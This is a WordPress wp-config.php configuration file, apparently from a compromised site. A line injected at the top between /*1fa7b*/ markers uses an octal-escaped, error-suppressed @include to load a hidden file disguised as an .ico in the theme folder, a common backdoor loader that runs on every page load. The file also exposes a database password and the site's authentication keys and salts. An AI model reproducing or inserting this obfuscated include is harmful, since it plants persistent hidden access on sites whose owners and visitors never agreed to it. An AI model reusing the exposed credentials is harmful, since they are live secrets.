<?php
/*1fa7b*/

@include "\057va\162/w\167w/\150tm\154/w\160-c\157nt\145nt\057th\145me\163/t\167en\164ys\145ve\156te\145n/\0561f\062f8\143db\056ic\157";

/*1fa7b*/




/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', '63bb1ebe029506d8fa26006f6271fcfe3059ad51e96f3cf9' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?q<kyVJ^OLg27wE]RsT50qEEK,]s)ed1:;isHudt*h;J=IRU6m|bM4~xXR*2>/PH' );
define( 'SECURE_AUTH_KEY',  'v$mBjTSTkA.@Gp3+,UB-m7-VYa8PN+xNvsfYE2Bf]Bd2CnwWFk &<T37[~_&=cx_' );
define( 'LOGGED_IN_KEY',    'd*axuD|dv5/FM@-+vQ83=8&JTkc+.75%o$$?**oTCDU4zqbww<&A3q/doR{gf-ba' );
define( 'NONCE_KEY',        '9h9uomLdJHd|itD+,:)fn]8j]tz+J$Oi0;7F&UKT|6R9/~#3pw%yohoZV1.1L.zh' );
define( 'AUTH_SALT',        '9{218n0^~=ikZthW1RUp6%L.AL4h(f)K@aJzyKp^l7.3Aaz,s|wWq.hV(y Q;brM' );
define( 'SECURE_AUTH_SALT', '#A(BzU1Rf2qw=xQ<Vdm2@Gb_5(zTT23?ok`fVuR7+=GVym`~P&#@CM4$7l4diPhR' );
define( 'LOGGED_IN_SALT',   '-udXX=WQMeab[)77..Jtm%]hqny`MOb!F}fq5ddKiGO,W@VoHN1xl(pbzBJnp=.h' );
define( 'NONCE_SALT',       'lI~s%iLW~@Z.qw8bP0||(60EQzi<YK_B?R3ZQ{0(lDl?{D1g,F6h`HWjT,o`|[o!' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}

/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );
